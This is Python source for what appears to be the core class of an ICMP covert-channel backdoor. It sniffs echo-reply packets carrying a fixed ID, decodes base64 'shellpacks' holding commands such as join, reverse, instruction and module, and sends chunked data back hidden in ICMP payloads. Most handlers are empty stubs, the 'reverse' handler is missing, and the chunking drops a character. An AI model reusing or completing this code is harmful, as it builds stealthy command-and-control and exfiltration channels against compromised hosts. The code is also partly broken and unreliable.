from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import ast
import base64
import time


TTL = int(64)
ICMP_ID = int(12800)
MAX_DATA_SIZE = 400

class Host:
    def __init__(self):
        self.id = str(round((time.time())*10**6))
        self.ip = get_local_ip()
        self.iface = get_iface(self.ip)

    def __str__(self) -> str:
        report =  f"[ Host Information ]\n"
        report += f" -- IP: {self.ip}\n"
        report += f" -- Interface: {self.iface}\n"

        return report

    def sniff_callback(self, packet):
        if packet[ICMP].type != 0:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        unpacked['ip'] = packet[IP].src

        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                self.instruction(unpacked)
            case "reverse":
                self.reverse(unpacked)
            case "heartbeat":
                self.heartbeat_response(unpacked)
            case "module":
                self.run_module(unpacked)
            case _:
                return
        
    def join(self, shellpack):
        pass

    def run_module(self, shellpack):
        pass

    def heartbeat_response(self, shellpack):
        pass

    def instruction(self, shellpack):
        pass
            
    def build_shellpacks(self, command: str,  data: str | None = None, option: str | None = None,) -> list[dict]:
        shellpacks = []

        shellpack = {
            "id": self.id,
            "command": command,
            "option": option,
            "data" : data
            }
        shellpack['option'] = "COMPLETE"
        encoded_shellpack = str(shellpack).encode()
        encoded_shellpack = base64.b64encode(encoded_shellpack)

        if data is not None and len(data) > MAX_DATA_SIZE:
            num_shellpacks = ( len(data) // MAX_DATA_SIZE ) + 1

            for i in range(num_shellpacks):
                if i == num_shellpacks-1:
                    shellpack['data'] = data[MAX_DATA_SIZE*i:-1]    
                    shellpack['option'] = "COMPLETE"
                else:
                    shellpack['data'] = data[MAX_DATA_SIZE*i:MAX_DATA_SIZE*(i+1)]
                    shellpack['option'] = "TRUNCATED"
                
                encoded_shellpack = str(shellpack).encode()
                encoded_shellpack = base64.b64encode(encoded_shellpack)

                shellpacks.append(encoded_shellpack)
            
        else:
            shellpacks = [encoded_shellpack]

        return shellpacks

    def send(self, ip, command: str, data: str | None = None, option: str | None = None) -> bool:
        shellpacks = self.build_shellpacks(command, data)

        for shellpack in shellpacks:
            data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
            sr(data, timeout=0, verbose=0)

def get_iface(ip) -> str:
    nics = psutil.net_if_addrs()
    iface = [i for i in nics for j in nics[i] if j.address==ip and j.family==socket.AF_INET][0]
    return iface
    
def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    try:
        s.connect(("192.255.255.255", 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip
